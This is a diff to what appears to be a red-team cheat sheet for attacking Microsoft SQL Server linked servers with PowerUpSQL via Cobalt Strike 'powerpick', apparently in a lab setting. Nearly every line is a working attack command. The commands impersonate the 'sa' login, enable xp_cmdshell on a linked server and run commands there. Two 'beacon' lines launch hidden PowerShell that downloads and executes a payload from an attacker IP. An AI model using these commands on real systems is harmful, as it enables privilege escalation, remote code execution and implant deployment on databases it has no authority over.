@@ -192,15 +192,15 @@ MSSQL (PowerUpSQL)
 		XP CMD SHELL STATUS (value_in_use : 1 = ENABLED)
 			powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; select * from openquery ([m3sqlw.m3c.local], 'select * from sys.configurations where name = ''xp_cmdshell''')"
 
-	ENABLE XP CMD SHELL ON LINKED SERVER (IMPERSONATE SA)
+	ENABLE XP CMD SHELL ON LINKED SERVER (2 DIFFERENT OPTIONS)
 		powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; EXECUTE('sp_configure ''show advanced options'', 1; reconfigure;') AT [m3sqlw.m3c.local];"
 		powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; EXECUTE('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [m3sqlw.m3c.local];"
 
-	EXECUTE COMMANDS ON LINKED SERVER (IMPERSONATE SA)
+	EXECUTE COMMANDS ON LINKED SERVER (2 DIFFERENT OPTIONS)
 		powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; select 1 from openquery ([m3sqlw.m3c.local], 'select 1; EXEC master..xp_cmdshell ''whoami''')"
 		powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; EXECUTE('master..xp_cmdshell ''whoami''') AT [m3sqlw.m3c.local];"
 
-	BEACON LINKED SERVER (IMPERSONATE SA)
+	BEACON LINKED SERVER (2 DIFFERENT OPTIONS)
 		powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; select 1 from openquery ([m3sqlw.m3c.local], 'select 1; EXEC master..xp_cmdshell ''powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(''''http://10.10.16.13:80/cyber''''))''')"
 		powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; EXECUTE('master..xp_cmdshell ''powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(''''http://10.10.16.13/cyber''''))''') AT [m3sqlw.m3c.local];"
 
